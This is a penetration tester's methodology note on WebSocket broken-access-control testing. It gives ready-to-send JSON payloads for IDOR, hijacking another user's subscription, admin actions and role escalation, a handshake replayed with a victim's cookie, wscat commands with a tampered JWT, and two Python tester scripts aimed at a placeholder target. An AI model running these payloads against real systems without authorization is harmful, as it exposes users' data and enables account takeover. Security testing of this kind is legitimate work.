---
tags: [bac, attack, websocket, realtime]
type: attack
severity: high
date: 2026-03-10
---

# 🔌 WebSocket BAC — Real-Time Authorization Failures

## Why WebSockets Are Different
HTTP access control fails are caught at the **handshake** level. But once a WebSocket connection is established, most frameworks don't re-validate authorization on **every message**. This creates unique BAC opportunities:

1. Handshake authorized → messages not checked per-action
2. Connection hijacking → sending messages as another user
3. Missing authorization on subscribe/join actions
4. Object-level auth missing on per-message resource IDs

---

## Attack Vector 1: Authorization Not Enforced Per-Message

```javascript
// After legitimate WebSocket handshake, send messages that
// reference resources you shouldn't own:

// Legitimate message:
{"action": "getOrder", "order_id": "MY_ORDER_ID"}

// Attack: swap order_id
{"action": "getOrder", "order_id": "VICTIM_ORDER_ID"}

// Server responds with victim's order data (IDOR via WebSocket)
```

---

## Attack Vector 2: Cross-Account Subscription IDOR

```javascript
// Subscribe to another user's real-time events:
{"action": "subscribe", "channel": "user_updates", "user_id": "VICTIM_ID"}

// If server streams victim's events to your connection:
// → Real-time data leak (messages, notifications, location, etc.)
```

---

## Attack Vector 3: Session Hijacking via WS Handshake

```http
# WebSocket handshake uses HTTP headers:
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Cookie: session=VICTIM_COOKIE  ← if you have their cookie

# Once connected, all subsequent messages sent as victim
```

---

## Attack Vector 4: Privilege Escalation via WS Messages

```javascript
// Test admin actions via WebSocket that would be blocked via HTTP:
{"action": "admin.deleteUser", "user_id": "9999"}
{"action": "admin.broadcastMessage", "message": "test"}
{"action": "system.config", "key": "ratelimit", "value": 0}
{"action": "user.setRole", "user_id": "MY_ID", "role": "admin"}
```

---

## Attack Vector 5: WS Protocol Downgrade

```
WSS (TLS) → WS (plaintext):
  - If app accepts ws:// when wss:// is expected
  - Intercept and modify messages in transit
  
HTTP → WebSocket upgrade bypass:
  - Admin-only WS endpoints accessible via regular WebSocket
```

---

## Testing WebSocket BAC

```python
#!/usr/bin/env python3
"""WebSocket BAC Tester"""
import websocket
import json

WS_URL = "wss://target.com/ws"
COOKIE = "session=YOUR_ATTACKER_TOKEN"

def test_ws_idor():
    headers = {"Cookie": COOKIE}
    ws = websocket.create_connection(WS_URL, header=headers)
    
    # Test 1: Access victim's resources
    victim_order = "ORDER_12345"
    ws.send(json.dumps({
        "action": "getOrder",
        "order_id": victim_order
    }))
    response = ws.recv()
    print(f"[IDOR Test] {response[:200]}")
    
    # Test 2: Admin action via WebSocket
    ws.send(json.dumps({
        "action": "admin.listUsers",
        "page": 1
    }))
    response = ws.recv()
    print(f"[Admin Test] {response[:200]}")
    
    # Test 3: Subscribe to victim's channel
    ws.send(json.dumps({
        "action": "subscribe",
        "channel": "user",
        "user_id": "VICTIM_USER_ID"
    }))
    response = ws.recv()
    print(f"[Subscribe Test] {response[:200]}")
    
    ws.close()

test_ws_idor()
```

---

## Burp Suite WebSocket Testing
```
1. Burp captures WebSocket traffic automatically in:
   Proxy → WebSockets history tab

2. Right-click any WS message → "Send to Repeater"
   → Edit and resend WebSocket messages

3. Test:
   - Swap user/resource IDs in messages
   - Try admin actions in message body
   - Capture messages from high-priv connection,
     replay in low-priv connection

4. Intercept WS handshake → modify upgrade request
   (add different session cookie, test auth check)
```

---

## Tasks
- [ ] #task Check if target uses WebSockets (DevTools → Network → WS tab)
- [ ] #task Log all WebSocket messages during normal app usage in Burp
- [ ] #task Identify messages with resource IDs — test IDOR
- [ ] #task Test subscription messages with other users' IDs
- [ ] #task Test admin actions via WS (often less guarded than HTTP API)
- [ ] #task Check if WS handshake validates auth, or just session existence

---

## 🔗 Related Notes
- [[IDOR-Techniques]]
- [[API-BAC]]
- [[Privilege-Escalation]]

---
*Tags: #websocket #bac #attack #realtime*

---

## WebSocket Auth Pattern 2: JWT via Query Parameter

Many modern React/Vue SPAs authenticate WebSocket connections using a JWT passed as a URL query parameter, not a cookie. This is the dominant pattern in mobile apps and SPAs that use token-based auth.

```
wss://target.com/ws?token=eyJhbGciOiJIUzI1NiJ9...
wss://target.com/realtime?access_token=eyJ...
wss://target.com/socket.io/?auth=eyJ...&EIO=4
```

**Testing approach:**
```bash
# Find WS token in JS source or DevTools → Network → WS → Headers tab
# Look for the Upgrade request URL — it often contains the token

# Test with modified JWT (alg:none or tampered role):
wscat -c "wss://target.com/ws?token=TAMPERED_JWT" \
  --subprotocol "json" \
  -x '{"action":"getUser","user_id":"VICTIM_ID"}'
```

**Updated Python tester supporting both auth patterns:**

```python
#!/usr/bin/env python3
"""WebSocket BAC Tester v2 — supports Cookie AND ?token= auth patterns"""
import websocket, json, sys

WS_URL  = "wss://target.com/ws"
TOKEN   = "eyJhbGciOiJIUzI1NiJ9.YOUR_JWT"

# Auth mode: "cookie" or "query_param"
AUTH_MODE = "query_param"     # change to "cookie" if needed
COOKIE    = "session=YOUR_COOKIE"

def get_ws_url():
    if AUTH_MODE == "query_param":
        sep = "&" if "?" in WS_URL else "?"
        return f"{WS_URL}{sep}token={TOKEN}"
    return WS_URL

def get_headers():
    if AUTH_MODE == "cookie":
        return {"Cookie": COOKIE}
    return {}

def run_test(label, message_dict):
    """Send a single WS message and print the response."""
    url = get_ws_url()
    headers = get_headers()
    try:
        ws = websocket.create_connection(url, header=headers, timeout=10)
        ws.send(json.dumps(message_dict))
        resp = ws.recv()
        ws.close()
        print(f"[{label}] → {resp[:250]}")
        return resp
    except Exception as e:
        print(f"[{label}] ERROR: {e}")
        return None

# Test 1: IDOR — access victim's resource
run_test("IDOR",       {"action": "getOrder",    "order_id": "VICTIM_ORDER"})

# Test 2: Subscription hijack
run_test("SUB-HIJACK", {"action": "subscribe",   "channel": "user", "user_id": "VICTIM_ID"})

# Test 3: Admin action via WS
run_test("ADMIN-ACTION",{"action": "admin.listUsers", "page": 1})

# Test 4: Tampered JWT via query param — swap role in token payload
# (generate tampered token with jwt_tool first, then set TOKEN= above)
run_test("TAMPERED-JWT", {"action": "getMyProfile"})
```

## WebSocket Token Discovery

```bash
# Find WS connections in DevTools:
# DevTools → Network tab → filter "WS" → click connection → Headers tab
# The "Request URL" row shows the full WS URL including ?token= params

# In JS source (grep patterns):
grep -rE "wss?://|new WebSocket|socket\.io|ws\.connect" ./js_files/
grep -rE "token=|access_token=|auth=" ./js_files/ | grep -i "ws\|socket"

# In Burp proxy:
# Proxy → WebSockets history — shows all WS connections including handshake URL
```
